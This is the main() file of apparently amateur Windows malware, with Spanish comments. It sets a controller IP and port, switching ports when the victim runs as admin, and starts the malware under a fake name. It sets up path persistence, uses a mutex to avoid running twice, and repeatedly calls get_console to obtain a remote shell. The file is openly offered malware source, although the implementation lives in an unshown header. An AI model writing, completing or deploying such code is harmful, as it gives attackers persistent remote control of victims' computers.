#include "malware.h"
#include <ShlObj.h>

#define DEFAULT_IP "127.0.0.1"
#define DEFAULT_PORT "8000"
#define DEFAULT_ADMIN_PORT "9999"
#define WAIT_CONECTION 5000
#define NUM_RETRY 10

int main(int argc, const char* argv[]) {
	char* ip = DEFAULT_IP;
	char* port = DEFAULT_PORT;
	bool check_path = TRUE;
	if (argc == 2) {
		if (argv[1] == PATH_KEY) //Miramos a ver si le pasamos el argumento PATH_KEY que significa que no checkee el path
			check_path = FALSE;
		else
			port = (char*)argv[1];
	}
	if (argc == 3) {
		port = (char*)argv[1];
		ip = (char*)argv[2];
	}
	if (IsUserAnAdmin())
		port = DEFAULT_ADMIN_PORT;

	MALWARE malware(ip, port, FAKE_NAME);
	if(check_path)
		malware.check_path_persistence();
	if (!IsUserAnAdmin() && malware.check_mutexe()) //Si ya est� corriendo el malware, no se ejeucta
		exit(EXIT_SUCCESS);

	int cont = 0;
	while (cont < NUM_RETRY) {
		malware.get_console();
		cont = cont + 1;
		Sleep(WAIT_CONECTION);
	}

	return 0;
}